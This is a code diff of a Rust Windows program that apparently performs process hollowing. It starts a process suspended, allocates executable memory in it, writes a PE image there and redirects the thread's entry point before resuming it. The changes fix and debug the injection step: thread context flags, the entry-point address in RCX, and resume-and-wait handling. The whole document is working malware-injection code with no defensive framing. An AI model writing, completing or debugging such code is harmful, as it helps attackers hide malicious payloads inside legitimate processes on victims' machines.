@@ -15,14 +15,15 @@ use windows_sys::{
     },
     Win32::System::{
         Diagnostics::Debug::{
-            CONTEXT, GetThreadContext, IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
-            ReadProcessMemory, SetThreadContext, WriteProcessMemory,
+            CONTEXT, CONTEXT_CONTROL_AMD64, CONTEXT_INTEGER_AMD64, GetThreadContext,
+            IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, ReadProcessMemory,
+            SetThreadContext, WriteProcessMemory,
         },
         Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
         SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
         Threading::{
             CREATE_SUSPENDED, CreateProcessA, PEB, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
-            ResumeThread, STARTUPINFOA,
+            ResumeThread, STARTUPINFOA, WaitForSingleObject,
         },
     },
 };
@@ -253,19 +254,31 @@ fn main() {
         }
 
         let mut ctx = zeroed::<CONTEXT>();
+        ctx.ContextFlags = CONTEXT_INTEGER_AMD64 | CONTEXT_CONTROL_AMD64;
 
         if GetThreadContext(pi.hThread, &mut ctx) == 0 {
             println!("[-] Failed to get thread context");
             return;
         }
 
-        ctx.Rcx = (remote_buffer as *const u8).add(address_of_entry_point as usize) as u64;
+        ctx.Rcx = (remote_buffer as usize + address_of_entry_point as usize) as u64;
+
+        println!(
+            "[+] Setting thread context to entry point: {:016x}",
+            ctx.Rcx
+        );
+
+        pause();
 
         if SetThreadContext(pi.hThread, &ctx) == 0 {
             println!("[-] Failed to set thread context");
             return;
         }
 
-        ResumeThread(pi.hThread);
+        if ResumeThread(pi.hThread) == 0 {
+            println!("[-] Failed to resume thread");
+            return;
+        }
+        WaitForSingleObject(pi.hThread, 0xFFFFFFFF);
     }
 }
